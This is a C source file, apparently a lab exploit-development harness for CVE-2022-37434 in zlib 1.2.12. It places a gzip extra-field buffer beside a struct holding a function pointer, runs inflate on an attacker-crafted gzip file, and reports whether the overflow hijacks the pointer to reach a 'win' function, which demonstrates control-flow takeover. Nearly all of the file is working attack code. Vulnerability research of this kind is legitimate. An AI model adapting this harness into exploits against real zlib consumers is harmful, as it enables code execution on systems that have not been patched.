/* wmark_harness.c — controlled write-marker rig for CVE-2022-37434 (zlib 1.2.12)
 *
 * Layout (mmap'd, guard page after):
 *   [ page0: extra_buf (extra_max bytes) | victim struct ] [ page1: PROT_NONE guard ]
 *
 * Flow mirrors a real gzip consumer that calls inflateGetHeader():
 *   inflateInit2(47) -> inflateGetHeader(head{extra,extra_max}) -> inflate(...)
 *
 * After inflate, the harness calls victim.fn(). On the vulnerable 1.2.12 path
 * the overflow's destination (head->extra + len) is attacker-influenced and its
 * content is attacker-controlled input bytes, so victim.fn can be redirected.
 *
 * The clamp knob (libz patched to honor WMARK_CLAMP) bounds the ~4 GB underflowed
 * length so the write-what-where semantics can be observed in a lab instead of
 * immediately faulting on the wild 4 GB memcpy.
 *
 * usage: ./wmark_harness <gz> <extra_max> <chunk>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <zlib.h>

typedef void (*fn_t)(void);

struct victim {
    fn_t fn;              /* target for hijack: +0 */
    uint64_t marker;      /* canary: +8 */
    char tag[16];         /* +16 */
};

static void win(void) {
    printf("  [!!] RIP CONTROL: victim->fn() executed win() at %p\n", (void*)win);
    fflush(stdout);
}
static void benign(void) {
    printf("  [ok] benign callback reached (no hijack)\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    if (argc < 4) { fprintf(stderr, "usage: %s <gz> <extra_max> <chunk>\n", argv[0]); return 2; }
    const char *gzpath = argv[1];
    unsigned extra_max = (unsigned)strtoul(argv[2], NULL, 0);
    size_t chunk = (size_t)strtoul(argv[3], NULL, 0);

    FILE *f = fopen(gzpath, "rb");
    if (!f) { perror("fopen"); return 2; }
    fseek(f, 0, SEEK_END); long fsz = ftell(f); fseek(f, 0, SEEK_SET);
    unsigned char *in = malloc((size_t)fsz);
    if (fread(in, 1, (size_t)fsz, f) != (size_t)fsz) { perror("fread"); return 2; }
    fclose(f);

    long pg = sysconf(_SC_PAGESIZE);
    unsigned char *region = mmap(NULL, (size_t)pg * 2, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) { perror("mmap"); return 2; }
    /* guard page -> proves the unbounded write runs off the mapped region */
    if (mmap(region + pg, (size_t)pg, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) {
        perror("mmap guard"); return 2;
    }

    unsigned char *extra = region;                              /* head->extra */
    struct victim *victim = (struct victim *)(region + extra_max); /* adjacent in same page */
    victim->fn = benign;
    victim->marker = 0xDEADBEEFCAFEF00DULL;
    strcpy(victim->tag, "SAFE");

    printf("== write-marker rig (CVE-2022-37434, zlib 1.2.12) ==\n");
    printf("extra buf   = %p (extra_max=%u)\n", (void*)extra, extra_max);
    printf("victim      = %p  fn=%p marker=0x%016llx\n", (void*)victim,
           (void*)victim->fn, (unsigned long long)victim->marker);
    printf("guard page  = %p (write crossing here faults)\n\n", (void*)(region + pg));
    fflush(stdout);

    z_stream strm;
    memset(&strm, 0, sizeof(strm));
    gz_header head;
    memset(&head, 0, sizeof(head));
    head.extra = extra;
    head.extra_max = extra_max;

    int rc = inflateInit2(&strm, 47);            /* gzip wrapper */
    if (rc != Z_OK) { fprintf(stderr, "inflateInit2: %d\n", rc); return 2; }
    rc = inflateGetHeader(&strm, &head);
    if (rc != Z_OK) { fprintf(stderr, "inflateGetHeader: %d\n", rc); return 2; }

    unsigned char outbuf[4096];
    size_t fed = 0;
    int ret = Z_OK;
    do {
        if (strm.avail_in == 0 && fed < (size_t)fsz) {
            size_t n = chunk < ((size_t)fsz - fed) ? chunk : ((size_t)fsz - fed);
            strm.next_in = in + fed;
            strm.avail_in = (uInt)n;
            fed += n;
        }
        strm.next_out = outbuf;
        strm.avail_out = (uInt)sizeof(outbuf);
        ret = inflate(&strm, Z_NO_FLUSH);
        if (ret != Z_OK && ret != Z_STREAM_END && ret != Z_BUF_ERROR && ret != Z_DATA_ERROR) break;
        if (ret == Z_STREAM_END || ret == Z_DATA_ERROR) break;
    } while (strm.avail_in > 0 || fed < (size_t)fsz);

    printf("\ninflate returned %d (%s)\n", ret, strm.msg ? strm.msg : "-");
    printf("head.extra_len=%u  (XLEN declared in the gzip header)\n", head.extra_len);
    printf("victim now: fn=%p marker=0x%016llx tag=%s\n",
           (void*)victim->fn, (unsigned long long)victim->marker, victim->tag);

    if (victim->fn != benign)
        printf("  [!!] victim->fn CLOBBERED (was benign=%p)\n", (void*)benign);

    printf("\n-- invoking victim->fn() --\n");
    fflush(stdout);
    victim->fn();

    inflateEnd(&strm);
    return 0;
}